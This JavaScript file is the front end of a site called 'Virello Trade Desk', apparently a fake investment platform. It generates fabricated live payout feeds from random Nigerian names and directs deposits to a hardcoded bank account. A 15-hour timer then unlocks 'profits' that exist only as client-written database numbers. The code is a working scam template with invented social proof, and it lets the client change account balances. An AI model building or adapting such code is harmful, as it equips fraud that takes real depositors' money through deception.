// --- ADMIN BANK CONFIG ---
const adminBank = {
    bankName: "Kuda Bank",
    accountNumber: "0123456789",
    accountName: "Virello Trade Desk"
};

// --- FIREBASE CONFIG ---
const firebaseConfig = {
    apiKey: "AIzaSyAzmG3VQf4SflqMZCypS9uNQpslwtpJliY",
    authDomain: "virello-19fc4.firebaseapp.com",
    projectId: "virello-19fc4",
    storageBucket: "virello-19fc4.firebasestorage.app",
    messagingSenderId: "1095895103025",
    appId: "1:1095895103025:web:a796acb6b7b9c30d6f0710"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

// --- NAVIGATION ---
function nav(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(id === 'landing') generateLiveFeed();
}

// --- GENERATE 100+ LIVE PAYOUTS ---
function generateLiveFeed() {
    const names = ["Adebayo", "Chika", "Musa", "Efetobor", "Olawale", "Zainab", "Ifeanyi", "Blessing", "Tunde", "Uchenna", "Fatima", "Oluwaseun"];
    const container = document.getElementById('payout-scroller');
    if(!container) return;
    container.innerHTML = "";
    
    for (let i = 0; i < 100; i++) {
        const name = names[Math.floor(Math.random() * names.length)] + " " + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + ".";
        const amt = [4800, 9100, 13500, 35000, 75000, 160000][Math.floor(Math.random() * 6)];
        const time = Math.floor(Math.random() * 59) + "m ago";
        
        const div = document.createElement('div');
        div.className = "payout-item";
        div.innerHTML = `<div><strong>${name}</strong><br><small>${time}</small></div><span>+₦${amt.toLocaleString()}</span>`;
        container.appendChild(div);
    }
}

// --- AUTHENTICATION ---
async function handleSignUp() {
    const name = document.getElementById('reg-name').value;
    const email = document.getElementById('reg-email').value;
    const pass = document.getElementById('reg-pass').value;
    if(!name || !email || pass.length < 6) return alert("All fields are required. Password: 6+ chars.");
    try {
        const res = await auth.createUserWithEmailAndPassword(email, pass);
        await db.collection('users').doc(res.user.uid).set({ name, email, balance: 0, created: Date.now() });
    } catch (e) { alert(e.message); }
}

async function handleLogin() {
    const email = document.getElementById('log-email').value;
    const pass = document.getElementById('log-pass').value;
    try { await auth.signInWithEmailAndPassword(email, pass); } catch (e) { alert(e.message); }
}

auth.onAuthStateChanged(user => {
    if (user) {
        db.collection('users').doc(user.uid).onSnapshot(doc => {
            if(doc.exists) document.getElementById('balance').innerText = "₦" + doc.data().balance.toLocaleString();
        });
        syncTimers();
        nav('dashboard');
    }
});

// --- DEPOSIT MODAL ---
function openDeposit() {
    document.getElementById('bank-name').innerText = adminBank.bankName;
    document.getElementById('bank-acc').innerText = adminBank.accountNumber;
    document.getElementById('bank-user').innerText = adminBank.accountName;
    document.getElementById('deposit-modal').style.display = 'block';
}
function closeModal() { document.getElementById('deposit-modal').style.display = 'none'; }

async function submitDeposit() {
    const amount = document.getElementById('dep-amount').value;
    const sender = document.getElementById('dep-sender').value;
    if(!amount || amount < 4000 || !sender) return alert("Min deposit is ₦4,000.");
    await db.collection('depositRequests').add({
        uid: auth.currentUser.uid,
        email: auth.currentUser.email,
        amount: Number(amount),
        sender: sender,
        status: "pending",
        timestamp: Date.now()
    });
    alert("Request sent! Your balance will update once verified.");
    closeModal();
}

// --- INVESTMENT & 15-HOUR TIMER ---
async function invest(cost, profit) {
    const userRef = db.collection('users').doc(auth.currentUser.uid);
    const doc = await userRef.get();
    if(doc.data().balance < cost) return alert("Insufficient Balance. Deposit first!");

    await userRef.update({ balance: firebase.firestore.FieldValue.increment(-cost) });
    const cashoutTime = Date.now() + (15 * 60 * 60 * 1000); 

    await db.collection('investments').add({
        uid: auth.currentUser.uid,
        profit: profit,
        status: "Running",
        cashoutAt: cashoutTime
    });
    alert("Trade Started! Timer: 15 Hours.");
}

function syncTimers() {
    db.collection('investments')
        .where("uid", "==", auth.currentUser.uid)
        .where("status", "==", "Running")
        .onSnapshot(snap => {
            const container = document.getElementById('trades-container');
            container.innerHTML = "";
            if(snap.empty) container.innerHTML = '<p class="empty-msg">No active investments.</p>';
            
            snap.forEach(doc => {
                const data = doc.data();
                const card = document.createElement('div');
                card.className = "trade-card";
                const tid = `t-${doc.id}`;
                card.innerHTML = `<div><strong>₦${data.profit.toLocaleString()}</strong><br><small>Trade Active</small></div><div class="timer-txt" id="${tid}">--:--:--</div>`;
                container.appendChild(card);

                const itv = setInterval(() => {
                    const diff = data.cashoutAt - Date.now();
                    const el = document.getElementById(tid);
                    if(!el) return clearInterval(itv);
                    if(diff <= 0) {
                        clearInterval(itv);
                        el.innerHTML = `<button class="btn-cashout" onclick="cashout('${doc.id}', ${data.profit})">CASH OUT</button>`;
                    } else {
                        const h = Math.floor(diff/3600000);
                        const m = Math.floor((diff%3600000)/60000);
                        const s = Math.floor((diff%60000)/1000);
                        el.innerText = `${h}h ${m}m ${s}s`;
                    }
                }, 1000);
            });
        });
}

async function cashout(id, amt) {
    await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(amt) });
    await db.collection('investments').doc(id).update({ status: "Completed" });
    alert("Success! ₦" + amt + " added to balance.");
}

// Initial Live Feed load
window.onload = generateLiveFeed;
